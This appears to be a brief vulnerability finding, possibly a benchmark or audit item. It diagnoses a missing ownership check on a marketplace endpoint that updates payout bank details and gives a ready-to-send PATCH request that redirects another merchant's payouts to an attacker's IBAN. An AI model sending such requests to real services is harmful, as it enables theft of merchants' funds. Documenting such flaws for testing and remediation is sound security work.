diagnosis: The merchant payout bank update endpoint validates inputs using Fastify schema definition and checks seller login via authenticateSeller, but does not verify that the authenticated seller profile matches the merchantId provided in the URL route parameter. An attacker can hijack daily payout disbursements of competitor merchants by replacing their IBAN with their own.
exploit_request:
PATCH /merchants/m_shop_8920194/payout-bank HTTP/1.1
Host: marketplace.api.com
Authorization: Bearer <seller_token>
Content-Type: application/json

{"iban": "DE89370400440532013000", "routingNumber": "021000021"}
